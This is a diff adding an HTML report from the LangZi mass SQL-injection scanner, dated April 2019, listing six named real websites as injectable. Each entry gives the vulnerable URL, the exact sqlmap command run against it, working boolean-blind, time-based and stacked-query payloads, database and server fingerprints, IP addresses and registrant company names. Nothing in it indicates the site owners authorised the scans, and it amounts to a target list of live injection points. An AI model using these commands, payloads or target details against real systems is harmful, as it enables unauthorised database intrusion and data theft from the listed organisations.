@@ -1,0 +1,750 @@
+
+                            <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <title>LAnGZi SQL Injection Report Version 3.8</title>
+                    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap-theme.min.css'>
+                    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css'>
+                </head>
+                <div class="container">
+                    <div class="navbar navbar-default">
+                        <div class="navbar-header">
+                            <a class="navbar-brand" href="#">LAnGZi</a>
+                        </div>
+                        <ul class="nav navbar-nav">
+                            <li><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html">项目地址</a>
+                            </li>
+                            <li>
+                                <a href="http://www.langzi.fun/%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF.html">可拓展信息处理</a>
+                            </li>
+                            <li>
+                                <a href="http://www.langzi.fun/Python%20%E6%89%AB%E6%8F%8FIP%E4%BB%A3%E7%90%86%E6%B1%A0.html">可拓展IP代理池</a>
+                            </li>
+                        </ul>
+                
+                    </div>
+                </div>
+
+            
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:32:00</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>新车上牌_中原汽车网_中原最专业的汽车资讯网站</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://zhongyuanauto.com/list.php?id=28</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://zhongyuanauto.com/list.php?id=28 --technique B --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> id (GET)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>id=28' AND 6314=6314 AND 'QuOV'='QuOV
+</td></tr><tr><td>数据库类型</td><td> MySQL
+</td></tr><tr><td>服务器版本</td><td>Windows 2003 or XP
+</td></tr><tr><td>服务器语言</td><td>ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+</td></tr><tr><td>数据库版本</td><td>MySQL >= 5.0.0
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>2</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://zhongyuanauto.com</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>新车上牌_中原汽车网_中原最专业的汽车资讯网站</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>河南省郑州市 景安网络BGP数据中心</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>203.171.228.17</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>10年4月（创建于2008年12月26日,过期时间为2019年12月26日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>豫ICP备18046062号-1</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>企业</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>郑州思创网络技术有限公司</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2018/12/28 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>2万9500</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> text/html  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> Microsoft-IIS/6.0 </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td>暂无信息</td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:32:07</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>租车指南_中原汽车网_中原最专业的汽车资讯网站</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://zhongyuanauto.com/list.php?id=49</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://zhongyuanauto.com/list.php?id=49 --technique B --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> id (GET)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>id=28' AND 6314=6314 AND 'QuOV'='QuOV
+</td></tr><tr><td>数据库类型</td><td> MySQL
+</td></tr><tr><td>服务器版本</td><td>Windows 2003 or XP
+</td></tr><tr><td>服务器语言</td><td>ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+</td></tr><tr><td>数据库版本</td><td>MySQL 5
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>2</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://zhongyuanauto.com</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>租车指南_中原汽车网_中原最专业的汽车资讯网站</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>河南省郑州市 景安网络BGP数据中心</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>203.171.228.17</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>10年4月（创建于2008年12月26日,过期时间为2019年12月26日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>豫ICP备18046062号-1</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>企业</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>郑州思创网络技术有限公司</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2018/12/28 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>2万9500</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> text/html  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> Microsoft-IIS/6.0 </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td>暂无信息</td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:32:17</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>长春市支点科技有限公司-知名互联网品牌服务机构</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://4006660407.com/index.php/Home/Case/info/Id/69/cid/3.html</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://4006660407.com/index.php/Home/Case/info/Id/69/cid/3*.html --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> #1* (URI)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>AND/OR time-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>MySQL >= 5.0.12 AND time-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>http://4006660407.com:80/index.php/Home/Case/info/Id/69/cid/3) AND SLEEP(5) AND (7725=7725.html
+</td></tr><tr><td>数据库类型</td><td> MySQL
+</td></tr><tr><td>服务器版本</td><td>Windows
+</td></tr><tr><td>服务器语言</td><td>ThinkPHP, ASP.NET
+</td></tr><tr><td>数据库版本</td><td>MySQL >= 5.0.12
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://4006660407.com</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>长春市支点科技有限公司-知名互联网品牌服务机构</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>获取失败</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>获取失败</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>9年5月3天（创建于2009年11月23日,过期时间为2019年11月23日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>吉ICP备09000445号-8</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>企业</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>长春市支点科技有限公司</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2018/6/8 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> -  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> - </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td> - </td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:34:59</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>项目管理者联盟第四十三期PgMP认证班在沪成功举办_项目管理者联盟</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://mypm.net/e_member/show_message_content.asp?ID=12042</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://mypm.net/e_member/show_message_content.asp?ID=12042 --technique B --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> ID (GET)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>ID=12042 AND 3358=3358
+</td></tr><tr><td>数据库类型</td><td> Microsoft SQL Server
+</td></tr><tr><td>服务器版本</td><td>Windows 2003 or XP
+</td></tr><tr><td>服务器语言</td><td>ASP.NET, Microsoft IIS 6.0, ASP
+</td></tr><tr><td>数据库版本</td><td>Microsoft SQL Server 2005
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>4</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://mypm.net</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>项目管理者联盟第四十三期PgMP认证班在沪成功举办_项目管理者联盟</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>河北省保定市 电信</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>111.225.222.134</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>17年3月27天（创建于2001年12月30日,过期时间为2021年12月30日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>京ICP备10055250号-5</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>企业</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>北京共创时网络管理技术有限公司</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2017/12/11 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>--</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> text/html  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> Microsoft-IIS/6.0 </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td> - </td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:36:15</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>尊享价_女童豆豆鞋2016新款公主鞋真皮流苏一脚蹬宝宝皮鞋加棉1-2-3岁潮_马蹄印母婴专营店</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://www.xiaodelan.com/jingpin_538802532257.html</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://www.xiaodelan.com/jingpin_538802532257*.html --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> #1* (URI)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>http://www.xiaodelan.com:80/jingpin_538802532257' AND 2378=2378 AND 'ezON'='ezON.html
+
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>stacked queries
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>MySQL > 5.0.11 stacked queries (comment)
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>http://www.xiaodelan.com:80/jingpin_538802532257';SELECT SLEEP(5)#.html
+
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>AND/OR time-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>MySQL >= 5.0.12 AND time-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>http://www.xiaodelan.com:80/jingpin_538802532257' AND SLEEP(5) AND 'AHZC'='AHZC.html
+</td></tr><tr><td>数据库类型</td><td> MySQL
+</td></tr><tr><td>服务器语言</td><td>PHP 7.0.5
+</td></tr><tr><td>数据库版本</td><td>MySQL > 5.0.11
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>1</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://www.xiaodelan.com</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>尊享价_女童豆豆鞋2016新款公主鞋真皮流苏一脚蹬宝宝皮鞋加棉1-2-3岁潮_马蹄印母婴专营店</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>香港 腾讯云</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>119.28.37.98</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>4年1月25天（创建于2015年03月01日,过期时间为2020年02月29日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> text/html; charset=UTF-8  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> Tengine/2.1.2 </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td> - </td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
+                    <div class="col-md-12 font-weight-bold"><br>
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            网站漏洞报表
+                        </div>
+                        <div class="panel-body">
+                            <table class="table">
+                
+                                <tr>
+                                    <td>发现时间</td>
+                    <td>2019-04-26:21:57:36</td>
+                </tr>
+
+
+                <tr>
+                    <td>网站标题</td>
+                    <td>http://scsiso.com</td>
+                </tr>
+
+
+                <tr>
+                    <td>注入网址</td>
+                    <td>http://scsiso.com/index.php/info/index/type/info/id/16.shtml</td>
+                </tr>
+                <tr>
+                    <td>执行命令</td>
+                    <td>D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\python.exe D:\HACKER_TOOLS\LANGZI_HACKER\LangZi_SQL_Injection_3.8\lib\sqlmap\sqlmap.py -u http://scsiso.com/index.php/info/index/type/info/id/16*.shtml --batch --thread=10 --random-agent</td>
+                </tr>
+                
+<tr><td>注入参数(方式)</td><td> #1* (URI)
+    </td></tr><tr class="active"><td>&nbsp;&nbsp;&nbsp;&nbsp;注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;注入攻击</td><td>http://scsiso.com:80/index.php/info/index/type/info/id/16 AND 4183=4183.shtml
+</td></tr><tr><td>数据库类型</td><td> MySQL
+</td></tr><tr><td>服务器版本</td><td>Windows
+</td></tr><tr><td>服务器语言</td><td>ThinkPHP, ASP.NET
+</td></tr><tr><td>数据库版本</td><td>MySQL >= 5.0.0
+</td></tr>
+                    </table>
+        </div>
+
+
+        <div class="panel-footer">
+            网站信息报表
+        </div>
+
+        <div class="panel-body">
+
+            <table class="table">
+
+                <tr>
+                    <td>百度权重</td>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <td>网站主页</td>
+                    <td>http://scsiso.com</td>
+                </tr>
+                <tr>
+                    <td>网站标题</td>
+                    <td>http://scsiso.com</td>
+                </tr>
+                <tr>
+                    <td>IP__坐标</td>
+                    <td>四川省绵阳市 电信</td>
+                </tr>
+                <tr>
+                    <td>所属__IP</td>
+                    <td>125.65.113.107</td>
+                </tr>
+                <tr>
+                    <td>网站年龄</td>
+                    <td>9年8月30天（创建于2009年07月27日,过期时间为2019年07月27日)</td>
+                </tr>
+                <tr>
+                    <td>备案编号</td>
+                    <td>苏ICP备17011085号-1</td>
+                </tr>
+                <tr>
+                    <td>备案性质</td>
+                    <td>企业</td>
+                </tr>
+                <tr>
+                    <td>备案名称</td>
+                    <td>苏州中迪企业管理咨询有限公司</td>
+                </tr>
+                <tr>
+                    <td>备案时间</td>
+                    <td>2017/3/8 0:00:00</td>
+                </tr>
+                <tr>
+                    <td>百度收录</td>
+                    <td>暂无信息</td>
+                </tr>
+                <tr>
+                    <td>协议类型</td>
+                    <td>HTTP/1.1 200 OK</td>
+                </tr>
+                <tr>
+                    <td>页面类型</td>
+                    <td> text/html; charset=utf-8  </td>
+                </tr>
+                <tr>
+                    <td>服务类型</td>
+                    <td> WWW Server/1.1 </td>
+                </tr>
+                <tr>
+                    <td>程序语言</td>
+                    <td> - </td>
+                                </tr>
+                            </table>
+                
+                        </div>
+                
+                    </div>
+                </div>
+
+                    
+                    
